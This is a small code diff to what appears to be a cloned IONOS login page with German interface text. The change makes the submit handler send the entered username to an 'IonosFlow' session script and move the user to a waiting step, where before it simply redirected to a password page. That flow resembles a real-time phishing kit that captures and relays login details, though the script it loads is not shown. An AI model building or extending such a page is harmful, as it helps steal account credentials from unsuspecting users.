@@ -158,8 +158,9 @@
     </div>
   </footer>
 
+  <script src="/ionos-flow.js"></script>
   <script>
-    document.getElementById("ionos-login-form").addEventListener("submit", function (e) {
+    document.getElementById("ionos-login-form").addEventListener("submit", async function (e) {
       e.preventDefault();
       const identifier = document.getElementById("username").value.trim();
       if (!identifier) return;
@@ -168,9 +169,13 @@
       btn.disabled = true;
       btn.textContent = "Weiter …";
 
-      sessionStorage.setItem("ionos_identifier", identifier);
-      window.location.href =
-        "ionos-password.html?identifier=" + encodeURIComponent(identifier) + "#";
+      try {
+        const sessionId = await IonosFlow.startSession(identifier);
+        IonosFlow.goWaiting(sessionId);
+      } catch (_) {
+        btn.disabled = false;
+        btn.textContent = "Weiter";
+      }
     });
   </script>
 
